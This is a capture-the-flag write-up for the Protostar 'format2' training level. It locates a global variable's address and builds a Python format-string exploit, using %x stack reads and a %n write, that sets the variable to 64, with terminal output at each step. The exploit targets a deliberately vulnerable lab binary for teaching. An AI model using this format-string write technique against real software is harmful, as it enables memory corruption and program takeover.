# Format2 Protostar


> This level moves on from format1 and shows how specific values can be written in memory.
>  
> This level is at /opt/protostar/bin/format2

First, let's find out the address of our target variable, `target`. It is the variable we want to override using format string exploit. We can use both `nm` and `objdump -t` to view the symbols table.
```
user@protostar:/opt/protostar/bin$ nm format2
[...]
080496e4 B target
08048454 T vuln
```
```
user@protostar:/opt/protostar/bin$ objdump -t format2

format2:     file format elf32-i386

SYMBOL TABLE:
[...]
08048454 g     F .text	00000067              vuln
080496d8 g     O .bss	00000004              stdin@@GLIBC_2.0
080496e4 g     O .bss	00000004              target
[...]
```



Since the hint states that this challenge is related to [format1][1], I edited its exploit script to fit format2.
```
import struct

is_time_to_exploit = False

exploit = struct.pack("I", 0x080496e4)  #Changed address of the variable
exploit += "\x41\x41\x41\x41"

total_length = 500
num_Dwords = 143

for i in range(num_Dwords):
	exploit += "_%x"

if is_time_to_exploit:
	exploit += "_%n"
	num_Dwords += 1

remaining_len = total_length - (num_Dwords * 3)

assert remaining_len >= 0

for i in range(remaining_len):
	exploit += "_"

print exploit
```

I first ran the script and saved the printed exploit string in a file I arbitrarily named `format2 input`. Using `cat`, I piped the exploit string into the stdin of `./format2`. It printed out 143 DWORDS of memory.
```
user@protostar:/opt/protostar/bin$ cat /home/user/format2\ input | ./format2
����AAAA_200_b7fd8420_bffff524_80496e4_41414141_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_78255f78_5f78255f_255f7825_5f5f5f78_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f5f_5f5f5f_b7ec6365_b7ff1040_bffff6f8_80484c6_80484e0_0_bffff778_b7eadc76_1_bffff7a4_bffff7ac_b7fe1848______________________________________________________________________target is 0 :(
```

Notice that time the address is closer to the top of the stack than in [format1][1]. This is because the string here is stored in a local variable in the function `<vuln>` instead of an argument passed to `<main>`.

The address of `target` is the 4th DWORD in the stack (ie `[...]200_b7fd8420_bffff524_80496e4_[...]`). Thus, we can need to print only 3 `"%x"` format string specifiers so that `"%n"` will dereference `80496e4` and write into `target`. We can ignore the first part of the output until "AAAA" as it is not the content of the stack.
```
import struct

is_time_to_exploit = True

exploit = struct.pack("I", 0x080496e4)
exploit += "\x41\x41\x41\x41"

total_length = 500
num_Dwords = 3

for i in range(num_Dwords):
	exploit += "_%x"

if is_time_to_exploit:
	exploit += "_%n"
	num_Dwords += 1

remaining_len = total_length - (num_Dwords * 3)

assert remaining_len >= 0

for i in range(remaining_len):
	exploit += "_"

print exploit
```

We successfully wrote a non-null value into the variable `target`. However, our goal this time round is to write a specific value, namely the integer value 64. So, we failed.
```
user@protostar:/opt/protostar/bin$ cat /home/user/format2\ input | ./format2
��AAAA_200_b7fd8420_bffff524___[...]__
target is 31 :(
```

You may wonder why `target` was 31. The table below breaks down the output. 31 characters were printed before `"%n"` wrote into `target`.

| Bytes | Number of characters so far |
| --- | --- |
| \xe4\x96\x04\x08 | 4 | 
|AAAA | 8 |
|_200 | 12 |
| bf7d | 16 |
| 8420 | 20 |
| _bff | 24 |
| ff52 | 28 |
| 4__ | 31 |


To successfully complete this level, we just need to print 64 characters before `"%n"` wrote into `target`. We could hardcode the number of characters to print, but I decided to take a different approach. Do you notice that the contents of the stack are printed with different number of characters? For instance, the first value of the stack is `0x200` (thus 3 characters are printed excluding 0x), whereas the second is `0xb7fd8420` (thus 8 characters are printed excluding 0x). I decided to standardize the number of characters printed by using a field width of 8 (ie `"%8x"` instead of "%x"). I removed the underscore characters as they were included only to make the output more readable when we were looking at the contents of the stack.

Since it is a guarantee that the address of `target` is the 4th DWORD in the stack, that means the first 3 DWORDS in the stack will now print 3 * 8 = 24 characters. We need to print another 40. Since the address of `target` itself takes 4 bytes, that leaves 36 bytes of padding. Thus I used `exploit += "AAAAAAAA" * 4 + "BBBB"`.

After making the changes described above, I have the following Python exploit script. You may wonder why is there this line of code - `total_length = 500`. It is gratuitous, I agree. It was necessary for [format1][1]. Even though it is not necessary here, there is no need to remove it as characters printed after `"%n"` are not included in the value printed into `target`.
```
import struct

is_time_to_exploit = True

exploit = struct.pack("I", 0x080496e4)
exploit += "AAAAAAAA" * 4 + "BBBB"

total_length = 500
num_Dwords = 3

for i in range(num_Dwords):
        exploit += "%8x"

if is_time_to_exploit:
        exploit += "%n"
        num_Dwords += 1

remaining_len = total_length - (num_Dwords * 3)

assert remaining_len >= 0

for i in range(remaining_len):
        exploit += "_"

print exploit
```

After running the exploit script, I successfully modified `target` with the desired value.
```
user@protostar:/opt/protostar/bin$ cat /home/user/format2\ input | ./format2
��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB     200b7fd8420bffff524____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________you have modified the target :)

```

[1]: https://github.com/solomonbstoner/solomonbston3r-ctf-diary/blob/master/Others/Exploit-Exercises/protostar/Format1%20Protostar.md